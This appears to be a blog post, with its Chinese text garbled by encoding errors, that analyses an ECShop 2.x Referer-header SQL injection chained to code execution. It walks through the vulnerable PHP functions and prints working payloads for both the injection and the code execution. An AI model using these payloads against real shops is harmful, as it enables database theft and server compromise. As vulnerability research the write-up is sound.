    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-27 00:03:02<br><img src="/wallpaper/[60268880.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å¾ˆå¤šQBçš„Passer6yç»™æˆ‘å‘äº†ä¸ªé•¿å¾—å¥‡å¥‡æ€ªæ€ªçš„payloadï¼Œæƒ³äº†ä¸‹ï¼Œå¥½åƒæ˜¯Ecshop 2.xçš„RCEï¼Œæ˜¨å¹´çœ‹åˆ°å°±æƒ³åˆ†æï¼Œä¸€ç›´æå¿˜äº†.. ä»Šæ™šè¡¥ä¸Šï¼<br>PS: é€Ÿåº¦ä¸æ¿€æƒ…çœŸçš„å¥½çœ‹ï¼ŒDwayne Johnsonå¤ªå¸…ahhhh</p><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨phpstudy 2018 æ­å»º</p><blockquote><p>åˆ†æå·¥å…·ï¼š PhpStorm<br>php 5.3.29 nts + Apache<br>MySQL 5.5.3</p></blockquote><h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>æ¼æ´å‘ç”Ÿåœ¨user.php çš„ Refererå¤„<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">72</span>:<span class="string">"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/0BD49A51-AEE2-4D13-A91A-9313BB129B0C.png" alt="e21d6b60329ce5b0f5a9129ba3da49b6"></p><h3 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>å…¶å®æ˜¯SQLæ³¨å…¥çš„è¿›ä¸€æ­¥åˆ©ç”¨ï¼ŒåŒæ ·æ˜¯åœ¨user.php<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/AF83B1F8-8389-4E44-AB11-AE46841695E0.png" alt="63cf020521a24682a91cb6aae5e91fbb"></p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h2><h3 id="SQLæ³¨å…¥æ¼æ´"><a href="#SQLæ³¨å…¥æ¼æ´" class="headerlink" title="SQLæ³¨å…¥æ¼æ´"></a>SQLæ³¨å…¥æ¼æ´</h3><p>ç›´æ¥çœ‹æ¼æ´å‘ç”Ÿç‚¹ï¼š<br>æ—¢ç„¶payloadæ˜¯ä»Refererä¼ è¿›æ¥çš„ï¼Œé‚£ä¹ˆå°±ç›´æ¥çœ‹<code>[&#39;HTTP_REFERER&#39;]</code><br><strong>user.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ç”¨æˆ·ç™»å½•ç•Œé¢ */</span></span><br><span class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = <span class="string">'user.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</span><br><span class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</span><br><span class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>$back_act</code> ä»<code>HTTP_REFERER</code>é‚£é‡Œæ‹¿åˆ°å€¼ï¼Œç„¶å<code>$smarty-&gt;assign(&#39;back_act&#39;, $back_act);</code><br>å°†<code>$back_act</code>ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨<code>assign</code>å‡½æ•°<br><img src="/Ecshop 2.x ä»£ç æ‰§è¡Œ.resources/AE65DFBE-6628-45D3-9296-922A907441D6.png" alt="754c7a3810743fdf7d2cf06aeea33529"><br>å®é™…è°ƒç”¨çš„æ˜¯<code>/includes/cls_template.php</code>ä¸‹çš„<code>assign</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tpl_var))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ($key != <span class="string">''</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_var[$key] = $val;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…¶å®æ˜¯æ³¨å†Œäº†æ¨¡æ¿å˜é‡ï¼Œç„¶åå›åˆ°loginå¤„ï¼Œè°ƒç”¨äº†displayå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line">        error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</span><br><span class="line">        $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</span><br><span class="line">            <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $out = implode(<span class="string">''</span>, $k);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>filenameä¾¿æ˜¯ä¼ å…¥çš„<code>user_passport.dwt</code>ï¼Œè¿™é‡Œè°ƒç”¨fetchå¤„ç†dwtæ–‡ä»¶ï¼Œè½¬åˆ°fetchå‡½æ•°ï¼Œä½¿ç”¨äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</span><br></pre></td></tr></table></figure></p><p>ç„¶åä½¿ç”¨make_compiledå‡½æ•°è¿›è¡Œç¼–è¯‘<br><code>user_passport.dwt</code>é‡Œé¢å­˜åœ¨{$back_act}å˜é‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align=<span class="string">"left"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"act"</span> value=<span class="string">"act_login"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"back_act"</span> value=<span class="string">"&#123;$back_act&#125;"</span> /&gt;</span><br><span class="line">&lt;input type="submit" name="submit" value="" class="us_Submit" /&gt;</span><br><span class="line">&lt;/td&gt;</span><br></pre></td></tr></table></figure></p><p>displayå‡½æ•°é‡Œå­˜åœ¨ä¸€ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœ<code>$out</code>æ˜¯å¦å­˜åœ¨<code>$this-&gt;_echash</code>ï¼Œè€Œè¿™ä¸ªhashå€¼ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé™æ€å˜é‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $_echash = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br></pre></td></tr></table></figure></p><p>æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œä»hashå¤„åˆ†å‰²ï¼Œç„¶åæŠŠ<code>$k</code>äº¤ç»™<code>$this-&gt;insert_mod($val)</code>å»å¤„ç†<br>ç»§ç»­è·Ÿ<code>insert_mod()</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // å¤„ç†åŠ¨æ€å†…å®¹</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</span><br><span class="line">        $para = unserialize($para);</span><br><span class="line">        $fun = <span class="string">'insert_'</span> . $fun;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $fun($para);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå…ˆç”¨<code>|</code>åˆ†å‰²ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œç„¶åå†ä½¿ç”¨<code>insert_</code>æ‹¼æ¥ï¼Œæ‰€ä»¥å…¶å®ï¼Œè¯¥å‡½æ•°åå’Œå‚æ•°å‡å¯æ§<br>å°±æ˜¯éœ€è¦å¯»æ‰¾ä¸€ä¸ª<code>insert_</code>å¼€å¤´çš„å‡½æ•°ã€‚</p><p>æœ€åï¼Œ<code>/includes/lib_insert.php</code>é‡Œå­˜åœ¨ä¸€ä¸ª<code>insert_ads</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</span><br><span class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</span><br><span class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($static_res[$arr[<span class="string">'id'</span>]] === <span class="keyword">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span>.</span><br><span class="line">                        <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                    <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</span><br><span class="line">                    <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                    <span class="string">"WHERE enabled = 1 AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] .</span><br><span class="line">                        <span class="string">"' AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span> .</span><br><span class="line">                    <span class="string">'ORDER BY rnd LIMIT 1'</span>;</span><br><span class="line">            $static_res[$arr[<span class="string">'id'</span>]] = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        $res = $static_res[$arr[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæˆ‘ä»¬çš„<code>$arr</code>æ•°ç»„ï¼Œæ˜¯å®Œå…¨å¯æ§çš„ï¼Œå°±é€ æˆäº†ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´<br>æ‰€ä»¥æ”»å‡»é“¾å°±å‡ºæ¥äº†</p><blockquote><p>user.php ï¼ˆè·å–$back_actï¼‰-&gt; assign() æ³¨å†Œå˜é‡ -&gt; display() è¾“å‡ºæ¨¡ç‰ˆ -&gt; æ ¹æ®hashï¼Œè¿›å…¥insert_mod() -&gt; æœ€åè°ƒç”¨insert_ads() å®Œæˆæ³¨å…¥</p></blockquote><p>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REFERER: hash + $fun | serialize(<span class="keyword">array</span>(<span class="string">"num"</span>=&gt;sqlpayload,<span class="string">"id"</span>=&gt;<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p><h3 id="ä»£ç æ‰§è¡Œ-1"><a href="#ä»£ç æ‰§è¡Œ-1" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>æ¼æ´ç‚¹åŒæ ·æ˜¯è¿™ä¸ªSQLæ³¨å…¥å¼•èµ·ï¼Œä¸»è¦æ˜¯å› ä¸º<code>insert_ads()</code>å‡½æ•°åé¢åˆå¼•å…¥äº†ä¸€ä¸ªfetch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$position_style = <span class="string">'str:'</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå°†<code>$position_style</code>è¿›è¡Œfetchï¼Œå¾€ä¸Šçœ‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[<span class="string">'position_style'</span>];</span><br></pre></td></tr></table></figure></p><p><code>$position_style</code>æ˜¯ä»SQLç»“æœé›†ä¸­å–çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥æ§åˆ¶<br>ä»£ç æ‰§è¡Œç‚¹åœ¨fetchå‡½æ•°é‡Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</span><br><span class="line">        &#123;</span><br><span class="line">            error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_seterror++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¹‹å‰å› ä¸º<code>$position_style</code>å·²ç»ç»è¿‡äº†<br><code>$position_style = &#39;str:&#39; . $position_style;</code>çš„å¤„ç†<br>æ‰€ä»¥<code>strncmp($filename,&#39;str:&#39;, 4) == 0</code>è‚¯å®šæ˜¯ä¸ºçœŸçš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œä»£ç .<br>ä½†æ˜¯éœ€è¦æ»¡è¶³<code>fetch_str</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!defined(<span class="string">'ECS_ADMIN'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            $source = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile($source);</span><br><span class="line">        &#125;</span><br><span class="line">        $source=preg_replace(<span class="string">"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is"</span>, <span class="string">""</span>, $source);</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">        &#123;</span><br><span class="line">            $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                 $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>åœ¨å¾€é‡Œé¢è·Ÿï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨äº†<code>$this-&gt;select()</code>å‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// æ³¨é‡Šéƒ¨åˆ†</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// å˜é‡</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                 return '';</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span 